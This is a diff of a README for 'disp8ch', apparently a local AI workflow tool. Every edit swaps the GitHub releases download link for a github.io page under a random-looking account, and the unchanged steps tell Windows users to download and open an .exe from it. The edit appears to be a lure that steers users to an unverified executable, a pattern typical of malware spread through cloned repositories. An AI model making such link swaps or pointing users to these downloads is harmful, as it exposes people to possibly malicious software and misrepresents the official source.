@@ -1,6 +1,6 @@
 # 🤖 disp8ch - Build visual workflows with local tools
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/monoplegiaunappetisingness288/disp8ch/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://monoplegiaunappetisingness288.github.io)
 
 disp8ch provides a workspace for your computer tasks. It turns your chat messages into visual maps. You can manage complex projects through simple automation. This software keeps your data on your machine. You choose to use your personal computer or a cloud server to power the intelligence.
 
@@ -26,7 +26,7 @@ These requirements ensure the AI responds without delay. If your computer lacks 
 
 Follow these steps to set up the application on your Windows machine.
 
-1. Go to the [official download page](https://github.com/monoplegiaunappetisingness288/disp8ch/releases).
+1. Go to the [official download page](https://monoplegiaunappetisingness288.github.io).
 2. Look for the file ending in .exe under the latest version name.
 3. Click the file to start your download.
 4. Open the file after the download finishes.
@@ -102,4 +102,4 @@ Agents perform better with clear instructions. Instead of saying "Sort my emails
 
 ## 🆙 Keeping your software updated
 
-The developers release updates to improve the logic in the agents and fix visual errors. Visit the [download page](https://github.com/monoplegiaunappetisingness288/disp8ch/releases) regularly to see if a newer version exists. If a new version exists, download the setup file again. The installer preserves your settings and your workflow history automatically. You do not need to delete your old work before you install the new version.
+The developers release updates to improve the logic in the agents and fix visual errors. Visit the [download page](https://monoplegiaunappetisingness288.github.io) regularly to see if a newer version exists. If a new version exists, download the setup file again. The installer preserves your settings and your workflow history automatically. You do not need to delete your old work before you install the new version.
